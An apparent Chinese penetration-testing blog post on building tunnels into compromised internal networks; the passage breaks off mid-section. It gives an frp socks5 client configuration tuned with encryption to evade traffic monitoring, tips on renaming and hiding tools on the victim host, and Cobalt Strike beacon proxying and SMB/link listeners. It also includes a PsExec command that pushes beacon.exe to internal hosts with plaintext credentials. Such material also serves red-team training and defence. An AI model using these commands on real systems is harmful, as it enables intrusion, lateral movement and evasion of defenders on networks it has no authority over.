---
title: 内网穿透常用方法系列总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17151365.html
source: 博客园 - 渗透测试中心
date: 2023-02-25
fetch_date: 2025-10-04T08:04:35.346544
---

# 内网穿透常用方法系列总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [内网穿透常用方法系列总结](https://www.cnblogs.com/backlion/p/17151365.html "发布于 2023-02-24 14:26")

## 前言

在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。

本文内容按以下思维导图展开

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142532264-1745740093.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129140343927-1962648808.png)

## 目标出网（socks代理）

这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。

### frp(socks5)

frp服务端配置文件

[common]

bind\_port = 8080

frp客户端配置文件

[common]

server\_addr = xx.xx.xx.xx

server\_port = 8080

#服务端口使用Web常见端口

[socks5]

type = tcp

remote\_port = 8088

plugin = socks5

use\_encryption = true

use\_compression = true

#socks5口令

#plugin\_user = SuperMan

#plugin\_passwd = XpO2McWe6nj3

此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。

use\_encryption = true 启用加密 [通信内容加密传输，有效防止流量被拦截]

use\_compression = true 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]

use\_encryption = true 、use\_compression = true 必须放在相关协议下面。

frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142533345-25461972.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129145033860-1652498206.png)

setg Proxies socks5:xxx.xxx.xxx.xxx:8088

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142534352-1447532887.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129145110477-1045729434.png)

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142535339-171170652.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129145127163-888568815.png)

加密压缩的对比

这是frp客户端配置文件中未使用 encryption 与 compression 功能，利用metasploit挂socks代理，扫描ms17\_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142537124-265593420.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129145302246-1137378291.png)

 使用 encryption 与 compression 功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142538872-1038217254.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129145325015-1537621900.png)

### CobaltStrike (socks4a)

到已控目标机的Beacon下将socks代理开启

beacon > socks 1024 #端口根据VPS实际情况进行设置

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142540260-1761613912.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129152346970-849203169.png)

 菜单栏中的 View > Proxy Pivots ，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142541215-1251437351.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129152928537-1235969511.png)

#### 上线不出网机器

这是link链接，只要主链路(出网机Beacon)掉线，均掉！

##### SMB Beacon

官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。

创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。

（在Listner生成SMB Beacon>目标主机>右键> spawn as>选中对应的Listener>上线）

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142542278-180468149.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129160431143-1459045315.png)

 运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142543098-1226011871.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129160546350-1607202515.png)

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142544024-1697757212.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129160601179-2077221505.png)

 可在主Beacon上用link host链接或unlink host断开。

beacon> link 192.168.144.155

beacon> unlink 192.168.144.155

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142544793-801332852.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129160848882-815676775.png)

##### Link Listener

 在已上线的主机创建Listener。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142545857-1740604679.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129162120504-1020949902.png)

 导出该类型Listener对应的可执行文件或dll等。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142546752-1507421909.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129162308344-883747774.png)

 选择刚建立的Listener。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142547847-1044211816.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129162425801-58112194.png)

 上传刚才生成的payload到当前已上线的目标机中，这里用PsExec.exe 工具 。(CobalStrike本身psexec功能不够强大)

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142549243-84796711.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129162509705-807279221.png)

 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。

```
beacon> shell C:\WINDOWS\Temp\PsExec.exe -accepteula \\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\WINDOWS\Temp\beacon.exe
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142550123-1684873727.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129163601774-249106093.png)

beacon> shell netstat -ano |findstr 4444

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142551200-270034115.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129163741428-1316602747.png)

##### SSH Login

beacon> ssh 192.168.144.174:22 root admin

beacon> ssh 192.168.144.203:22 root admin

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142552831-1968669971.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129163846005-298040984.png)

 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224142553943-548434050.png)](https://img2020.cnblogs.com/blog/1964477/202011/1964477-20201129163942277-16...